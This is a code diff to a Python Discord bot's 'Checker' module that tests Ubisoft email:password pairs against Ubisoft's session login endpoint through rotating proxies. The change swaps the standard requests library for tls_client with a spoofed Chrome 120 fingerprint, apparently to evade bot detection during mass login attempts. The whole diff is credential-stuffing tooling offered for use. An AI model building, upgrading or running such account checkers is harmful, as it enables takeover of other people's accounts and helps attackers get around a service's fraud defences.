@@ -8,7 +8,7 @@ import asyncio
 import random
 import io
 import os
-import requests # Standard requests, NOT curl_cffi
+import tls_client
 import json
 
 UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6"
@@ -69,20 +69,21 @@ class Checker(commands.Cog):
         embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
         
         proxy = random.choice(self.proxies) if self.proxies else None
-        proxies_dict = {"http": proxy, "https": proxy} if proxy else None
 
         try:
-            # Run synchronous requests in a separate thread to not block discord
-            def do_request():
-                return requests.post(
+            def do_tls_request():
+                session = tls_client.Session(client_identifier="chrome_120")
+                if proxy:
+                    session.proxies = {"http": proxy, "https": proxy}
+                
+                return session.post(
                     "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                     headers=headers,
                     json={"rememberMe": True},
-                    proxies=proxies_dict,
-                    timeout=15
+                    timeout_seconds=15
                 )
 
-            response = await asyncio.to_thread(do_request)
+            response = await asyncio.to_thread(do_tls_request)
             
             if response.status_code == 200:
                 embed.color = 0x57F287
@@ -208,15 +209,16 @@ class Checker(commands.Cog):
                 }
 
                 proxy = random.choice(self.proxies) if self.proxies else None
-                proxies_dict = {"http": proxy, "https": proxy} if proxy else None
                 
                 def do_req():
-                    return requests.post(
+                    session = tls_client.Session(client_identifier="chrome_120")
+                    if proxy:
+                        session.proxies = {"http": proxy, "https": proxy}
+                    return session.post(
                         "https://public-ubiservices.ubi.com/v3/profiles/sessions",
                         headers=headers,
                         json={"rememberMe": True},
-                        proxies=proxies_dict,
-                        timeout=15
+                        timeout_seconds=15
                     )
 
                 try:
